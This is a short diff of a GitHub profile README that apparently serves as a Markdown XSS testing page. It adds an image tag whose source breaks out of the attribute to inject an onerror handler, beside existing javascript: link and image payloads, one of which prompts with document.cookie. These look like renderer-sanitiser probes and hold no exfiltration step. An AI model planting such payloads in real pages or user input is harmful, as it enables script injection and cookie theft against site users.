@@ -48,6 +48,8 @@ hello [hack](javascript:javascript:alert('xss'))
 
 ![XSS'"`onerror=prompt(document.cookie)](javascript://%0d%0aprompt(1);com)\
 
+![Escape SRC - onerror](#"onerror="alert('ImageOnError'))
+
 <!--
 **blackb1rd/blackb1rd** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
 
